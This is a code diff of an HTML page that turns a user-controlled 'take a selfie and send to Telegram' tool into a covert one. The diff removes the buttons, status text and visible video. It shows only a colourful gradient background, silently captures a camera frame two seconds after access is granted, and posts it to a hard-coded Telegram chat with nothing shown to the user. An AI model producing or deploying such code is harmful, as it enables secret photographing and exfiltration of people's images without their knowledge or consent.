@@ -2,48 +2,30 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Selfie Capture and Send to Telegram</title>
+    <title>Automated Selfie Capture</title>
     <style>
+        /* RGB Background */
         body {
-            font-family: Arial, sans-serif;
-            text-align: center;
             margin: 0;
-            padding: 20px;
-            background-color: #f0f0f0;
+            padding: 0;
+            height: 100vh;
+            width: 100vw;
+            background: linear-gradient(45deg, red, green, blue);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
         }
-        #videoElement {
-            width: 300px;
-            height: 300px;
-            background-color: #666;
-            border-radius: 10px;
-        }
-        #captureButton, #sendButton {
-            margin: 20px;
-            padding: 10px 20px;
-            font-size: 16px;
-        }
-        #capturedImage {
-            margin-top: 20px;
-            width: 300px;
-            height: 300px;
-            border-radius: 10px;
-        }
-        #status {
-            margin-top: 20px;
-            font-weight: bold;
+        /* Hide all elements except the video */
+        #videoElement, #capturedImage {
+            display: none;
         }
     </style>
 </head>
 <body>
 
-    <h1>Take a Selfie</h1>
-    <video id="videoElement" autoplay></video><br>
-    <button id="captureButton">Capture Photo</button>
-    <button id="sendButton" disabled>Send to Telegram</button>
-    <div>
-        <img id="capturedImage" src="" alt="Your Selfie">
-    </div>
-    <div id="status"></div>
+    <video id="videoElement" autoplay></video>
+    <img id="capturedImage" src="" alt="Captured Selfie">
 
     <script>
         // Telegram Bot Token and Chat ID
@@ -51,23 +33,20 @@
         const CHAT_ID = '5519921687';
 
         const video = document.getElementById('videoElement');
-        const captureButton = document.getElementById('captureButton');
-        const sendButton = document.getElementById('sendButton');
         const capturedImage = document.getElementById('capturedImage');
-        const statusDiv = document.getElementById('status');
 
         // Access the device camera and stream to video element
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
                 video.srcObject = stream;
+                // Automatically capture after a short delay
+                setTimeout(captureAndSend, 2000); // 2 seconds delay
             })
             .catch(err => {
                 console.error("Error accessing camera: ", err);
-                statusDiv.textContent = "Unable to access camera.";
             });
 
-        // Capture the photo
-        captureButton.addEventListener('click', () => {
+        function captureAndSend() {
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
@@ -75,17 +54,6 @@
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             const dataURL = canvas.toDataURL('image/png');
             capturedImage.src = dataURL;
-            sendButton.disabled = false;
-            statusDiv.textContent = "Photo captured. Ready to send.";
-        });
-
-        // Send the photo to Telegram
-        sendButton.addEventListener('click', () => {
-            const dataURL = capturedImage.src;
-            if (!dataURL) {
-                statusDiv.textContent = "No photo to send.";
-                return;
-            }
 
             // Convert base64 to Blob
             fetch(dataURL)
@@ -103,17 +71,15 @@
                 .then(response => response.json())
                 .then(data => {
                     if (data.ok) {
-                        statusDiv.textContent = "Photo sent successfully!";
+                        console.log("Photo sent successfully!");
                     } else {
-                        statusDiv.textContent = "Failed to send photo.";
-                        console.error(data);
+                        console.error("Failed to send photo:", data);
                     }
                 })
                 .catch(error => {
                     console.error("Error sending photo: ", error);
-                    statusDiv.textContent = "Error sending photo.";
                 });
-        });
+        }
     </script>
 
 </body>
